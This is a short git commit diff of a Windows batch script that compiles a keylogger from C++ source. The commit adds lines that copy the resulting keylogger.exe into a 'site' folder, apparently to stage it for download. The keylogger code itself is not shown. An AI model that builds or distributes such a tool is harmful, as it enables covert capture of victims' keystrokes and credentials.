7bbb01c5c18bdb4e6b6dfd95babc00b9030f52d6
Samarrrtthh <Samarthz0901@gmail.com>
2026-01-31 02:16:37 +0530

    push

--- compile.bat
+++ compile.bat
@@ -3,6 +3,8 @@ echo Compiling keylogger...
 g++ keylogger.cpp -o keylogger.exe -luser32 -lkernel32
 if %errorlevel% equ 0 (
     echo Compilation successful! keylogger.exe created.
+    copy /Y keylogger.exe site\keylogger.exe
+    echo Copied keylogger.exe to site folder.
 ) else (
     echo Compilation failed!
     pause
